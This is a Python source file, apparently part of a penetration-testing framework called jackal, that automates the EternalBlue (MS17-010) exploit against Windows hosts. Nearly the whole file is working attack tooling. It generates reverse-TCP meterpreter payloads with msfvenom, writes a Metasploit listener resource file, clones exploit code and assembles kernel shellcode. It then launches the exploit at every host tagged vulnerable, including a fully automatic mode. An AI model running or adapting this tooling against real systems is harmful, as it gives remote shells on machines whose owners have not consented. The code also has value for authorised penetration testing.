#!/usr/bin/env python3
import argparse
import ipaddress
import os
import socket
import subprocess
from struct import pack

import psutil
from jackal import Service, ServiceSearch, HostSearch, Host
from jackal.config import Config
from jackal.utils import print_error, print_notification, print_success, draw_interface


class Eternalblue(object):
    """
        Object to store variables, setup everything to start exploiting and exploit all the targets.
    """


    def __init__(self, ip, auto, port64, port32, *args, **kwargs):
        self.config = Config()
        self.ip = ip
        self.auto = auto
        self.datadir = os.path.join(self.config.config_dir, 'MS17-010')
        self.port64 = port64
        self.port32 = port32
        self.resource_file = ''
        if not os.path.exists(self.datadir):
            os.makedirs(self.datadir)


    def setup(self):
        """
            This function will call msfvenom, nasm and git via subprocess to setup all the things.
            Returns True if everything went well, otherwise returns False.
        """
        lport64 = self.port64
        lport32 = self.port32
        print_notification("Using ip: {}".format(self.ip))

        print_notification("Generating metasploit resource file")
        resource = """use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port64}
set ExitOnSession false
run -j
set payload windows/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port32}
set ExitOnSession false
run -j
""".format(ip=self.ip, port64=lport64, port32=lport32)
        self.resource_file = os.path.join(self.datadir, 'ms17_resource.rc')
        with open(self.resource_file, 'w') as f:
            f.write(resource)
        print_success("Resource file created, run the following command in msfconsole:")
        print_success("resource {}".format(self.resource_file))

        command_64 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o {datadir}/payload32.bin".format(ip=self.ip, port=lport32, datadir=self.datadir)
        command_32 = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o {datadir}/payload64.bin".format(ip=self.ip, port=lport64, datadir=self.datadir)
        print_notification("Generating payloads")

        process = subprocess.run(command_32.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            print_error("Problem with generating payload:")
            print_error(process.stderr)
            return False

        process = subprocess.run(command_64.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            print_error("Problem with generating payload:")
            print_error(process.stderr)
            return False

        if not os.path.exists(os.path.join(self.datadir, 'MS17-010')):
            print_notification("Git repo was not found, cloning")
            process = subprocess.run("git clone https://github.com/mwgielen/MS17-010 {dir}".format(dir=os.path.join(self.datadir, 'MS17-010')).split(' '))
            if process.returncode != 0:
                print_error("Problems with cloning git")
                return False

        process = subprocess.run("nasm {datadir}/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o {datadir}/kshell64.bin".format(datadir=self.datadir).split(' '))
        if process.returncode != 0:
            print_error("Problems with NASM")
            return False
        process = subprocess.run("nasm {datadir}/MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o {datadir}/kshell86.bin".format(datadir=self.datadir).split(' '))
        if process.returncode != 0:
            print_error("Problems with NASM")
            return False

        self.combine_files('kshell64.bin', 'payload64.bin', 'final_met_64.bin')
        self.combine_files('kshell86.bin', 'payload32.bin', 'final_met_32.bin')
        self.create_payload('final_met_32.bin', 'final_met_64.bin', 'final_combined.bin')
        print_notification("Combining payloads done")
        print_success("Setup Done")
        return True


    def create_payload(self, x86_file, x64_file, payload_file):
        """
            Creates the final payload based on the x86 and x64 meterpreters.
        """
        sc_x86 = open(os.path.join(self.datadir, x86_file), 'rb').read()
        sc_x64 = open(os.path.join(self.datadir, x64_file), 'rb').read()

        fp = open(os.path.join(self.datadir, payload_file), 'wb')
        fp.write(b'\x31\xc0\x40\x0f\x84' + pack('<I', len(sc_x86)))
        fp.write(sc_x86)
        fp.write(sc_x64)
        fp.close()


    def combine_files(self, f1, f2, f3):
        """
            Combines the files 1 and 2 into 3.
        """
        with open(os.path.join(self.datadir, f3), 'wb') as new_file:
            with open(os.path.join(self.datadir, f1), 'rb') as file_1:
                new_file.write(file_1.read())
            with open(os.path.join(self.datadir, f2), 'rb') as file_2:
                new_file.write(file_2.read())


    def detect_os(self, ip):
        """
            Runs the checker.py scripts to detect the os.
        """
        process = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'checker.py'), str(ip)], stdout=subprocess.PIPE)
        out = process.stdout.decode('utf-8').split('\n')
        system_os = ''
        for line in out:
            if line.startswith('Target OS:'):
                system_os = line.replace('Target OS: ', '')
                break
        return system_os


    def exploit(self):
        """
            Starts the exploiting phase, you should run setup before running this function.
            if auto is set, this function will fire the exploit to all systems. Otherwise a curses interface is shown.
        """
        search = ServiceSearch()
        host_search = HostSearch()
        services = search.get_services(tags=['MS17-010'])
        services = [service for service in services]
        if len(services) == 0:
            print_error("No services found that are vulnerable for MS17-010")
            return

        if self.auto:
            print_success("Found {} services vulnerable for MS17-010".format(len(services)))
            for service in services:
                print_success("Exploiting " + str(service.address))
                host = host_search.id_to_object(str(service.address))
                system_os = ''

                if host.os:
                    system_os = host.os
                else:
                    system_os = self.detect_os(str(service.address))
                    host.os = system_os
                    host.save()
                text = self.exploit_single(str(service.address), system_os)
                print_notification(text)
        else:
            service_list = []
            for service in services:
                host = host_search.id_to_object(str(service.address))
                system_os = ''

                if host.os:
                    system_os = host.os
                else:
                    system_os = self.detect_os(str(service.address))
                    host.os = system_os
                    host.save()

                service_list.append({'ip': service.address, 'os': system_os, 'string': "{ip} ({os}) {hostname}".format(ip=service.address, os=system_os, hostname=host.hostname)})
            draw_interface(service_list, self.callback, "Exploiting {ip} with OS: {os}")


    def callback(self, service):
        """
            Callback for curses, will call exploit_single with the right arguments.
        """
        return self.exploit_single(service['ip'], service['os'])


    def exploit_single(self, ip, operating_system):
        """
            Exploits a single ip, exploit is based on the given operating system.
        """
        result = None
        if "Windows Server 2008" in operating_system or "Windows 7" in operating_system:
            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit7.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif "Windows Server 2012" in operating_system or "Windows 10" in operating_system or "Windows 8.1" in operating_system:
            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit8.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            return ["System target could not be automatically identified"]
        return result.stdout.decode('utf-8').split('\n')


def get_own_ip():
    """
        Gets the IP from the inet interfaces.
    """
    own_ip = None
    interfaces = psutil.net_if_addrs()
    for _, details in interfaces.items():
        for detail in details:
            if detail.family == socket.AF_INET:
                ip_address = ipaddress.ip_address(detail.address)
                if not (ip_address.is_link_local or ip_address.is_loopback):
                    own_ip = str(ip_address)
                    break
    return own_ip


def main():
    argparser = argparse.ArgumentParser(description="Eternalblue exploit. Will use the services tagged with MS17-010. First run setup, then exploit.")
    argparser.add_argument('type', metavar='type', \
        help='setup or exploit', \
        type=str, choices=['setup', 'exploit'], default='setup', nargs='?')
    own_ip = get_own_ip()
    argparser.add_argument('--ip', help='Local ip to use, default is {}'.format(own_ip), \
        type=str, default=own_ip)
    argparser.add_argument('--auto', help='Full auto mode, will try to exploit every system.', action='store_true')
    argparser.add_argument('--port64', help='Port to listen for on 64 bits, default is 4444.', default=4444, type=int)
    argparser.add_argument('--port32', help='Port to listen for on 64 bits, default is 4445.', default=4445, type=int)
    arguments = argparser.parse_args()
    ms17 = Eternalblue(arguments.ip, arguments.auto, arguments.port64, arguments.port32)
    if arguments.type == 'setup':
        ms17.setup()
    else:
        ms17.exploit()


if __name__ == '__main__':
    main()
